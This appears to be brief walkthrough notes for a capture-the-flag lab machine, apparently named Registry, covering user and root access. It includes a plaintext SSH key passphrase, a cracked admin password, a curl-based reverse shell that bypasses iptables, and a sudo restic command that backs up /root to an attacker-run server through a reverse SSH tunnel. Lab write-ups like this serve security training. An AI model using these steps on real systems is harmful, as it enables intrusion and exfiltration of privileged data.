                                                           USER
                                                                  
                                                                  
Perform a nmap scan to get the domain we need to use I.e docker.registry.htb 

http://docker.registry.htb/v2/ and see how to extract all blobs . 

 See docker_image_fetch.py for juicy URLs 
 
 Now  use GkOcz221Ftb3ugog as password to decrypt ssh key and login using it as bolt 
 
 
 
                                                           ROOT  
                                                                  
                                                                  
Visit /bolt/bolt to get login page and crack the bcrypt hash to login as admin:strawberry 

Then for reverse shell as www-data we need to bypass iptables so set up a listener in bolt ssh session and get reverse shell using curl as bolt. 

Sudo –l  

ssh -R 8000:127.0.0.1:8000 -i id_rsa bolt@registry.htb for remote port forwarding (not Local as we wanted to set connection from bolt to my pc not vice versa) 

Set up docker container and start restic server on kali and then run sudo /usr/bin/restic backup -r rest:http://admin:admin@127.0.0.1:8000/root/ to get root copy 
